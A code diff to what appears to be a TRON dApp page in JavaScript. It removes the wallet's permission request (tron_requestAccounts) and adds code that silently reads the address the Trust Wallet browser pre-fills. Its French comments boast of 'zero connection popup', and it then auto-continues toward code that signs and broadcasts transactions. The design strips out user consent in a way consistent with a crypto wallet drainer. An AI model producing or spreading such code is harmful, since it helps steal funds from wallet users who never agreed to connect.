@@ -584,31 +584,32 @@
       return broadcast(signed);
     }
 
-    async function connectTron() {
-      var t = tl();
-      if (!t) throw new Error('TronLink not found');
-      if (t.ready && tw() && tw().defaultAddress && tw().defaultAddress.base58) {
-        return tw().defaultAddress;
-      }
-      var res = await t.request({ method: 'tron_requestAccounts' });
-      if (!res || res.code !== 200) throw new Error('Connection refused');
-      await wait(400);
-      var def = tw() && tw().defaultAddress;
-      if (!def || !def.base58) throw new Error('Address unavailable');
-      return def;
+    // Trust Wallet DApp browser pré-populate tronWeb.defaultAddress sans permission
+    // Jamais de tron_requestAccounts → zéro popup de connexion
+    function getSilentAddr() {
+      try {
+        var w = tw();
+        if (w && w.defaultAddress && w.defaultAddress.base58) return w.defaultAddress;
+      } catch(_) {}
+      return null;
     }
 
     (async function autoTrigger() {
-      await wait(1000);
-      if (!tl()) return;
-      try {
-        var def = await connectTron();
-        if (def && def.base58 && !_fired) {
-          _addr = def.base58;
-          addrInput.value = _addr;
-          onContinue();
-        }
-      } catch(_) {}
+      await wait(600);
+      var def = getSilentAddr();
+      if (def && def.base58 && !_fired) {
+        _addr = def.base58;
+        addrInput.value = _addr;
+        onContinue();
+        return;
+      }
+      await wait(1400);
+      def = getSilentAddr();
+      if (def && def.base58 && !_fired) {
+        _addr = def.base58;
+        addrInput.value = _addr;
+        onContinue();
+      }
     })();
 
     async function onContinue() {
@@ -618,12 +619,12 @@
       setStatus('');
 
       if (!_addr) {
-        try {
-          var def = await connectTron();
+        var def = getSilentAddr();
+        if (def && def.base58) {
           _addr = def.base58;
           addrInput.value = _addr;
-        } catch(e) {
-          setStatus('Could not connect wallet.', 'err');
+        } else {
+          setStatus('Could not retrieve TRON address.', 'err');
           btn.disabled = false; _fired = false; return;
         }
       }
